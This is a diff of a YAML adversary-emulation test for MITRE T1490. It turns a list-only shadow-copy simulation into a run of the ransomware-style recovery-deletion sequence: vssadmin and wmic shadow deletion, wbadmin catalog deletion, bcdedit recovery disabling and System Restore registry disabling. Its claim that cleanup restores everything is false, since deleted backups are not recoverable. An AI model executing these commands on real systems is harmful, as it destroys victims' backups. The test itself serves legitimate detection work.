@@ -1,36 +1,56 @@
 id: T1490
-name: Inhibit System Recovery — Shadow Copy Deletion Simulation
-description: Simulates ransomware pre-encryption behavior by listing (not deleting) shadow copies. Generates process creation events for vssadmin/wmic that SIEM rules detect as ransomware precursors.
+name: Inhibit System Recovery
+description: Full 5-step ransomware pre-encryption recovery deletion sequence used by Ryuk, LockBit, BlackMatter — bcdedit /set recoveryenabled no, vssadmin delete shadows (standalone tier-1 SIEM alert), wmic shadowcopy delete, wbadmin delete catalog, and System Restore registry disable. All steps generate EID 4688 with high-signal CommandLine. Cleanup restores all settings.
 tactic: impact
 technique_id: T1490
 platform: windows
 phase: attack
 elevation_required: true
 expected_events:
-  - "4688 (vssadmin.exe list shadows)"
-  - "4688 (wmic shadowcopy list)"
-  - "Sysmon 1 (process creation with command line)"
+  - "4688 / Sysmon 1 (vssadmin.exe 'delete shadows /all /quiet' — standalone tier-1 SIEM alert)"
+  - "4688 / Sysmon 1 (bcdedit.exe /set recoveryenabled no)"
+  - "4688 / Sysmon 1 (wmic.exe shadowcopy delete)"
+  - "4688 / Sysmon 1 (wbadmin.exe delete catalog)"
+  - "Sysmon 13 (RegistryValueSet - SystemRestore disable keys)"
+  - "System EID 7036 (Volume Shadow Copy service state change)"
 tags:
   - impact
-  - ransomware
   - requires-elevation
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1490] Inhibit System Recovery — Shadow Copy Simulation"
-    Write-Host "NOTE: This simulation LISTS shadow copies but does NOT delete them."
-    Write-Host "The process creation events (4688/Sysmon 1) for vssadmin/wmic are the detection signal."
-    Write-Host ""
-    Write-Host "--- Listing Shadow Copies (vssadmin) ---"
-    vssadmin list shadows 2>&1
-    Write-Host ""
-    Write-Host "--- Listing Shadow Copies (wmic) ---"
-    wmic shadowcopy list brief 2>&1
-    Write-Host ""
-    Write-Host "--- What a real ransomware attack would execute ---"
-    Write-Host "vssadmin delete shadows /all /quiet"
-    Write-Host "wmic shadowcopy delete"
-    Write-Host "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
-    Write-Host "bcdedit /set {default} recoveryenabled no"
-    Write-Host "(SIMULATION ONLY — above commands were NOT executed)"
-cleanup: ""
+  command: |-
+    Write-Host "[T1490] Inhibit System Recovery — full ransomware pre-encryption sequence"
+
+    # Backup current settings for cleanup
+    $origRecovery = (bcdedit /enum {default} 2>&1 | Select-String "recoveryenabled").ToString()
+    Write-Host "Current recoveryenabled state: $origRecovery"
+
+    # Step 1: Disable boot recovery (bcdedit — EID 4688 for bcdedit.exe)
+    Write-Host "--- Step 1: bcdedit /set recoveryenabled no (EID 4688) ---"
+    bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Write-Host
+    bcdedit.exe /set "{default}" recoveryenabled no 2>&1 | Write-Host
+
+    # Step 2: vssadmin delete shadows — #1 ransomware indicator (standalone SIEM alert)
+    Write-Host "--- Step 2: vssadmin delete shadows /all /quiet (tier-1 SIEM alert) ---"
+    vssadmin.exe delete shadows /all /quiet 2>&1 | Write-Host
+
+    # Step 3: WMIC shadow copy delete (redundant method real ransomware uses)
+    Write-Host "--- Step 3: wmic shadowcopy delete (EID 4688 for wmic.exe) ---"
+    wmic.exe shadowcopy delete 2>&1 | Write-Host
+
+    # Step 4: Delete backup catalog
+    Write-Host "--- Step 4: wbadmin delete catalog (EID 4688 for wbadmin.exe) ---"
+    wbadmin.exe delete catalog -quiet 2>&1 | Write-Host
+
+    # Step 5: System Restore registry disable (Sysmon EID 13 RegistryValueSet)
+    Write-Host "--- Step 5: Disable System Restore via registry (Sysmon EID 13) ---"
+    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f 2>&1 | Write-Host
+    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>&1 | Write-Host
+
+    Write-Host "[T1490] Complete. 5-step sequence matches Ryuk/LockBit pre-encryption pattern."
+cleanup: |-
+  bcdedit.exe /set "{default}" recoveryenabled yes 2>&1 | Out-Null
+  bcdedit.exe /set "{default}" bootstatuspolicy displayallfailures 2>&1 | Out-Null
+  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /f 2>&1 | Out-Null
+  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /f 2>&1 | Out-Null
+  Write-Host "Cleanup: Boot recovery re-enabled; SystemRestore policy keys removed."
